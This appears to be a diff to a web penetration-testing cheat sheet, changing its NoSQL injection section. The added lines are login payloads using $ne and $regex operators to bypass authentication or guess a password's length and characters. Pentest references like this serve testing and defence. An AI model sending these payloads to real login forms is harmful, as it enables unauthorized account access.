@@ -833,11 +833,11 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
   
 ## NOSQL Injection
 
--> Bypass Auth
-username=test&password=test
-
-username=admin&password[$ne]=admin
-https://book.hacktricks.xyz/pentesting-web/nosql-injection
+-> Auth bypass  
+username=test&password=test  
+username=admin&password[$ne]=abc  
+username=admin&password[$regex]=^.{6}$  
+username=admin&password[$regex]=^a.....  
   
 ## Graphql Introspection
 
